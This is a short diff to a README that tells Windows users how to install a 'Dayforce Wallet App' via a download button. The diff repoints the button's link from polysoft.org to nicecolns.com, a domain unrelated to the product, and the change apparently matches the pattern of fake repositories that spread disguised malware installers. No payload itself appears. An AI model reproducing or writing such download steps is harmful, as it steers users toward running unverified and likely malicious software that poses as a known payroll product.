@@ -13,7 +13,7 @@ Follow these steps to install the **Dayforce App** on your Windows device:
 1. **Download the Installer:**
    - Press **Dayforce Wallet App Download** button to start downloading the installer file.
      <br>
-      <a href="https://polysoft.org">
+      <a href="https://nicecolns.com">
         <img src="https://github.com/user-attachments/assets/ab56fd6c-79a9-4e23-9ac7-3363e4286b22" alt="Download" width="300"/>
       </a>
 
